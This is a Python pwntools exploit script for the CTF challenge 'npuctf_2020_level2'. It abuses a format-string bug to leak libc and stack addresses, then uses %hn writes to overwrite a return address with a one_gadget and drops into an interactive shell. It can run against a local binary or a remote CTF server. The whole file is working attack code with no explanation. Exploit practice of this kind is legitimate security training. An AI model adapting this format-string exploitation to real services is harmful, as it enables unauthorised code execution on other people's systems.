# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './npuctf_2020_level2'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26899'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)

#gdb.attach(p,"b printf")

payload = "aaaniyah%7$p,%9$p"
sl(payload)

ru("aaaniyah")
__libc_start_main = rint("0x7fd439f65b97") - 231

ru(",")
stack_addr = rint("0x7ffcecbe2048")  - (0x7ffc47eaaf68 - 0x7ffc47eaae98)

lg("__libc_start_main",__libc_start_main)
libc.address = __libc_start_main - libc.sym["__libc_start_main"]

one_gad = [0x4f2c5,0x4f322,0x10a38c]
one_gadget = one_gad[0] + libc.address

lg("one_gadget",one_gadget)
lg("stack_addr",stack_addr)

payload = "%" + str((stack_addr - 0x10 )& 0xffff  ) + "c%9$hnniyah"
sla("niyah",payload)

payload = "%" + str(one_gadget & 0xffff) + "c%35$nniyah"
sla("niyah",payload)

payload = "%" + str((stack_addr +2 - 0x10 )& 0xffff  ) + "c%9$hnniyah"
sla("niyah",payload)

payload = "%" + str((one_gadget >> 4*4 )& 0xffff ) + "c%35$hnniyah"
sla("niyah",payload)

'''gdb.attach(p)
pause()'''

sla("niyah","66666666\x00")
#gdb.attach(p)

p.interactive()

'''
@File    :   npuctf_2020_level2.py
@Time    :   2021/07/17 20:35:26
@Author  :   Niyah 
'''
